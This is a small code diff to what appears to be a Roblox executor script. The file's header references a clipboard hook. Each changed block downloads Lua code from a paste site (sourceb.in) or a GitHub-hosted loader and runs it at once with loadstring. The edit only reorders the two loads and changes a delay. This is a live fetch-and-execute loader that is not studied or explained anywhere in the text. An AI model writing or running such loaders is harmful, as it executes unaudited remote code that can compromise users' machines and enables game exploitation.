@@ -14,11 +14,10 @@ if not getgenv()._clipboardHooked then
 end
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/GlhFalKoKT/0", true))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/games/refs/heads/main/loader.lua', true))()
 end)
 
 task.spawn(function()
-    task.wait(5)
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/renardofficiel/games/refs/heads/main/loader.lua', true))()
-
+    task.wait(3)
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/GlhFalKoKT/0", true))()
 end)
